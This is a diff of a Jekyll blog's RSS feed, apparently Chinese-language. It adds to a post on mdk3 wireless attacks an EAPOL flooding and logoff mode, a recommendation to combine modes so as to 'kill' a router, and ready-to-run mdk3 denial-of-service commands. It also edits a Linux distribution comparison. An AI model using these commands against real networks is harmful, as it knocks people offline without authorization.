@@ -6,8 +6,8 @@
 </description>
     <link>http://example.com/</link>
     <atom:link href="http://example.com/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Sun, 28 Aug 2016 12:40:11 +0800</pubDate>
-    <lastBuildDate>Sun, 28 Aug 2016 12:40:11 +0800</lastBuildDate>
+    <pubDate>Tue, 30 Aug 2016 08:15:00 +0800</pubDate>
+    <lastBuildDate>Tue, 30 Aug 2016 08:15:00 +0800</lastBuildDate>
     <generator>Jekyll v3.2.1</generator>
     
       <item>
@@ -112,12 +112,35 @@ Deauthentication/Disassociation Amok：&lt;br /&gt;
 &lt;/code&gt;&lt;/pre&gt;
 &lt;/div&gt;
 
+&lt;p&gt;第四种模式：&lt;br /&gt;
+802.1X test:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mdk3 mon0 x  
+      0 - EAPOL Start packet flooding   #EAPOL格式的报文洪水攻击
+
+            -n &amp;lt;ssid&amp;gt;               
+            -t &amp;lt;bssid&amp;gt;        #目标客户端的mac地址               
+
+            -w &amp;lt;WPA type&amp;gt;
+               Set WPA type (1: WPA, 2: WPA2/RSN; default: WPA)
+            -u &amp;lt;unicast cipher&amp;gt;
+               Set unicast cipher type (1: TKIP, 2: CCMP; default: TKIP)
+            -m &amp;lt;multicast cipher&amp;gt;
+               Set multicast cipher type (1: TKIP, 2: CCMP; default: TKIP)
+            -s &amp;lt;pps&amp;gt;      #速率，默认400               
+      1 - EAPOL Logoff test       #注销认证攻击
+            -t &amp;lt;bssid&amp;gt;        #目标客户端的mac地址             
+            -c &amp;lt;bssid&amp;gt;         #目标ap的合法客户端mac               
+            -s &amp;lt;pps&amp;gt;         #速率，默认400               
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
 &lt;p&gt;最后，建议这样攻击：&lt;br /&gt;
-第一种和第三种同时使用会造成大面积间歇性断网，第二种可以配合之前扫描到的路由器进行攻击，威力无比&lt;br /&gt;
+第一种和第三种同时使用会造成大面积间歇性断网，第二种可以配合第四种进行攻击，会导致路由器死亡&lt;br /&gt;
 分别是&lt;/p&gt;
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./mdk3 mon0 b
 ./mdk3 mon0 d -s 120
-./mdk3 mon0 a -a {你要攻击的路由器MAC（BSS）}
+./mdk3 mon0 a -a {你要攻击的路由器MAC(BSS)}
+./mdk3 mon0 x 1 -c {客户端MAC(虚拟)} -t {路由器MAC(BSS)}
 &lt;/code&gt;&lt;/pre&gt;
 &lt;/div&gt;
 
@@ -193,7 +216,7 @@ Linux操作系统诞生于1991 年10 月5 日（这是第一次正式向外公�
  Ubuntu严格来说不能算一个独立的发行版本，Ubuntu是基于Debian的unstable版本加强而来，可以说Ubuntu是一个拥有Debian所有的优点，以及自己所加强的优点的近乎完美的Linux桌面系统。根据选择的桌面系统不同，有三个版本可供选择，基于Gnome的Ubuntu，基于KDE的Kubuntu以及基于Xfc的Xubuntu。特点是界面非常友好，容易上手，对硬件的支持非常全面，是最适合做桌面系统的Linux发行版本。但十分&lt;strong&gt;臃肿！&lt;/strong&gt;&lt;br /&gt;
  如果你不需要自己进行定制，不想在系统上浪费太多时间，那么你可以根据自己的爱好在ubuntu、kubuntu以及xubuntu中选一款吧，三者的区别仅仅是桌面程序的不一样。&lt;/li&gt;
       &lt;li&gt;Fedora,它是一款优秀的Linux发行版，基于Redhat，为Redhat系的一员，由Redhat资助，社区维护。其软件包、系统内核、内核技术始终使用业界最新，使用了许多新技术。可以说是引领Linux界。安装起来也&lt;strong&gt;很简单，运行流畅，驱动支持性极好&lt;/strong&gt;，比较&lt;strong&gt;适合新手&lt;/strong&gt;。更重要的是&lt;strong&gt;Fedora一直没有背离Linux理念！&lt;/strong&gt;&lt;/li&gt;
-      &lt;li&gt;Arch Linux是现阶段最好的滚动发行版，好吧，我可能因为我是 Arch Linux用户而产生了偏见。更重要的是 Arch 在其他方面也表现良好。&lt;br /&gt;
+      &lt;li&gt;Arch Linux是现阶段最好的滚动发行版。更重要的是 Arch 在其他方面也表现良好。&lt;br /&gt;
  Arch Linux 是一个为那些想了解 Linux 一切的人准备的发行版，因为你必须手动安装一切，它会让你学会基于 Linux 的操作系统的每个部分。Arch Linux 是最可定制的发行版，你获得的只是一个基础系统，然后你可以在它上面建立属于你个人的发行版。不论好坏，它都不像 openSUSE 和 Ubuntu，它没有额外的补丁和整合内容，你甚至可以获得上游开发者创建的内容。Arch Linux 也是最好的滚动发行版之一。他总是更新，用户始终使用最新的软件包，并且他们还可以通过稳定的存储库运行预发布软件。Arch 也因优异的文档闻名。 Arch Wiki 可以让我得到任何 Linux 相关的资料。它提供的所有的包和软件都可在“任何” Linux 发行版上运行。&lt;/li&gt;
     &lt;/ol&gt;
   &lt;/li&gt;
